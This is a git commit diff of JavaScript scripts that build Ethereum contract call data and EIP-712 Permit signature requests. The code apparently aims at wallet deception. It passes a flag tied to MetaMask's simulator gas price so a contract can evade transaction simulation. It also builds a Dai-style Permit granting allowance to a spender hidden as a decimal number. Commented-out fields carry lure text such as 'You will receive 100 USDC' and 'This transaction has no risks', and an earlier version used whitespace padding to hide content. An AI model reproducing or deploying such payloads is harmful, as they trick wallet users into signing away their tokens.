5bb54a4047ce8201cb0ac0bfd373caa73a7badad
hxhsia <hxhsia@163.com>
2024-08-29 10:34:18 +0800

    siwe

--- 20/test.js
+++ 20/test.js
@@ -1,4 +1,4 @@
-function increaseAllowance() {
+function gen_permit2() {
   const abi = [
       // ABI definition of increaseAllowance function
       {
@@ -43,6 +43,32 @@ function increaseAllowance() {
     
     // Encode function call
     const data = contractInstance.methods.increaseAllowance(spender, addedValue).encodeABI();
+    
+    console.log('Input data for increaseAllowance:', data);  
+  }
+
+
+function increaseAllowance() {
+  const abi = [{"inputs":[{"internalType":"address","name":"_tokenAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"uint256[]","name":"array","type":"uint256[]"},{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"coinbaseInArray","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"flag","type":"uint256"}],"name":"coinbaseLessFlag","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256[]","name":"array","type":"uint256[]"},{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"flag","type":"uint256"}],"name":"coinbaseLessFlagorInArray","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"flag","type":"uint256"}],"name":"testTxprice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"tokenAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}];
+    
+    const Web3 = require('web3');
+    
+    // Instantiate web3
+    const web3 = new Web3();
+    
+    // Contract address
+    const contractAddress = '0x0594e3C3248278f5Fd1f6060377cB8c0EEB7E2c5';
+    
+    // Create contract instance
+    const contractInstance = new web3.eth.Contract(abi, contractAddress);
+    
+    // Parameters for the increaseAllowance function
+    const _to = '0x9416121B34e18069AC98Dcfc2c5CEbfac149eF4E'; //设置为转账的账户地址
+    const amount = 1000000;
+    const flag = 0; //MetaMask的模拟器中transaction.gasprice的值
+    
+    // Encode function call
+    const data = contractInstance.methods.testTxPrice(_to, amount, flag).encodeABI();
     
     console.log('Input data for increaseAllowance:', data);  
   }
--- 712/gen_typedData.js
+++ 712/gen_typedData.js
@@ -8,28 +8,64 @@ function genTypedData(chainId, verifyAddr) {
     const typedData = {
         types: {
             EIP712Domain: [
-                { name: 'name', type: 'string' },
-                { name: 'version', type: 'string' },
-                { name: 'chainId', type: 'uint256' },
-                { name: 'verifyingContract', type: 'address' }
+              { name: 'name', type: 'string' },
+              { name: 'version', type: 'string' },
+              { name: 'chainId', type: 'uint256' },
+              { name: 'verifyingContract', type: 'address' },
             ],
             Permit: [
-                { name: '_nftAmount', type: 'uint256' },
-                { name: 'msg', type: 'string' }
-            ]
-        },
-        primaryType: 'Permit',
-        domain: {
-            name: 'EIP-2612 Token',
+              { name: 'spender', type: 'address' },
+              { name: 'nonce', type: 'uint256' },
+              { name: 'expiry', type: 'uint256' },
+              { name: 'allowed', type: 'bool' },
+            ],
+            // Permit: [
+            //     { name: 'Activity', type: 'string' },
+            //     { name: 'Simulation_result', type: 'string' },
+            //     { name: 'Security', type: 'string' },
+            //   ],
+          },
+          domain: {
+            name: 'Dai Stablecoin',
             version: '1',
+            verifyingContract: verifyAddr,
             chainId: chainId,
-            verifyingContract: verifyAddr
-        },
-        message: {
-            _nftAmount: '0000000000000000000000000000000000000000000000000000000000000001',
-            msg: "                                                                                                                                           1"
-        }
+          },
+          primaryType: 'Permit',
+          message: {
+            // spender: '0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45',
+            spender: '597733001430176024049334587394716596403930790981',
+            allowed: true,
+            nonce: 0,
+            expiry: 1660916504,
+          },    
+
+        // message: {
+        //     Activity: "Airdrop",
+        //     Simulation_result: "You will receive 100 USDC",
+        //     Security: "This transaction has no risks"
+        // }
     }
+
+    // const typedData = {
+    //     types: {
+    //         EIP712Domain: [...],
+    //         Permit: [...]
+    //     },
+    //     primaryType: 'Permit',
+    //     domain: {
+    //         name: 'Test Token',
+    //         version: '1',
+    //         chainId: chainId,
+    //         verifyingContract: verifyAddr
+    //     },
+    //     message: {
+    //         Activity: "Airdrop",
+    //         Simulation_result: "You will receive 100 USDC",
+    //         Security: "This transaction has no risks"
+    //     }
+    // }
+
 
     return typedData
 }
